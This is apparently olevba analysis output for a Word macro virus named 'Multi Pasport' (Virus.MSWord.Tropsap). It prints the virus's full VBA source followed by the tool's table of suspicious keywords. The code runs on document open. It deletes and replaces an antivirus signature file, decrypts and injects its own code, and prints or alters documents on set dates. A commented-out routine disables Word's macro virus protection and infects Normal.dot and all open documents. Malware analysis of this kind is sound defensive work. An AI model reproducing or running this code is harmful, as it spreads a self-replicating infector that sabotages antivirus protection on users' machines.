olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tropsap
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tropsap - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Multi Pasport
' Written by Bullet [PCLO]
' Odessa 2001

Const CountLines = 27
Const StartLine = 41
Dim NormalDot, ActiveDoc As Object

Private Sub Document_Open()
    On Error Resume Next
    Set NormalDot = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    Set ActiveDoc = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
    If Application.UserName = "Bullet" Then Exit Sub
    Kill ("C:\Program Files\Common Files\AVP Shared Files\AVPBASES\macro.avc")
    FileCopy "C:\Program Files\Common Files\AVP Shared Files\AVPBASES\trojan.avc", "C:\Program Files\Common Files\AVP Shared Files\AVPBASES\macro.avc"
    For I = 0 To CountLines
        TempString = Me.VBProject.VBComponents.Item(1).CodeModule.Lines(StartLine + I, 1)
        DecryptCode = Right(TempString, Len(TempString) - 1)
        Me.VBProject.VBComponents.Item(1).CodeModule.InsertLines (StartLine + CountLines + I + 1), DecryptCode
    Next I
    Document_New
    For Ie = 0 To CountLines
        Me.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 69
    Next Ie
    If (Day(Now()) = 14 Or Day(Now()) = 21 Or Day(Now()) = 28) Then
        Set myRange = ActiveDocument.Range(Start:=0, End:=0)
        With myRange
            .InsertBefore "Multi Pasport"
            .Font.Size = 24
            .ParagraphFormat.Alignment = wdAlignParagraphCenter
            .InsertParagraphAfter
            .Font.Bold = True
        End With
    ElseIf (Day(Now()) = 5 Or Day(Now()) = 25) Then
        ActiveDocument.PrintOut
    End If
    If NormalTemplate.Saved = True Then NormalTemplate.Save
    If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
Private Sub Document_New()
'    On Error Resume Next
'    Const InfectLabel = "' Multi Pasport"
'    Set ActiveDoc = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
'    Set NormalDot = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
'    WriteCode = Me.VBProject.VBComponents.Item(1).CodeModule.Lines(1, Me.VBProject.VBComponents.Item(1).CodeModule.CountOfLines - 2 - CountLines) & vbCrLf & "End Sub"
'    Application.Options.VirusProtection = False
'    If NormalDot.Lines(1, 1) <> InfectLabel Then
'        NormalDot.DeleteLines 1, NormalDot.CountOfLines
'        If NormalDot.CountOfLines = 0 Then  NormalDot.AddFromString WriteCode
'        If NormalTemplate.Saved = True Then NormalTemplate.Save
'    Else
'        If ActiveDoc.Lines(1, 1) <> InfectLabel Then
'            ActiveDoc.DeleteLines 1, ActiveDoc.CountOfLines
'            If ActiveDoc.CountOfLines = 0 Then ActiveDoc.AddFromString WriteCode
'            If ActiveDocument.Saved = True Then ActiveDocument.Save
'        End If
'        k = 1
'        Do Until k = Application.Documents.Count
'            If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> InfectLabel Then
'                Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'            End If
'            If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
'                Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.AddFromString WriteCode
'            End If
'            If Application.Documents.Item(k).Saved = False Then Application.Documents.Item(k).Save
'            k = k + 1
'        Loop
'    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

